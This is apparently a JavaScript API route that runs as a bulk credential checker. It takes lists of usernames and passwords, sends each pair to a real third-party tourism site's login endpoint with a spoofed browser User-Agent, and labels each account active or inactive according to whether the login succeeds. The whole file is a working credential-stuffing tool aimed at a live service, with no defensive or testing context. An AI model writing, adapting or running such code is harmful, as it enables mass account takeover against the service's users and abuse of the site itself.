export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).end("Method Not Allowed");

  const { credentials } = req.body;
  const results = [];

  for (const { username, password } of credentials) {
    const data = Buffer.from(`${username}:${password}`).toString("base64");

    const payload = { data };
    const headers = {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "User-Agent": "Mozilla/5.0"
    };

    try {
      const response = await fetch("https://www.irctctourism.com/NewUserlogin/user/loginForIv4", {
        method: "POST",
        headers,
        body: JSON.stringify(payload),
      });

      const result = await response.json();

      if (result.status === "SUCCESS") {
        results.push({ username, status: "✅ Active" });
      } else {
        results.push({ username, status: "❌ Inactive" });
      }
    } catch (error) {
      results.push({ username, status: "❌ Error" });
    }
  }

  return res.status(200).json(results);
}
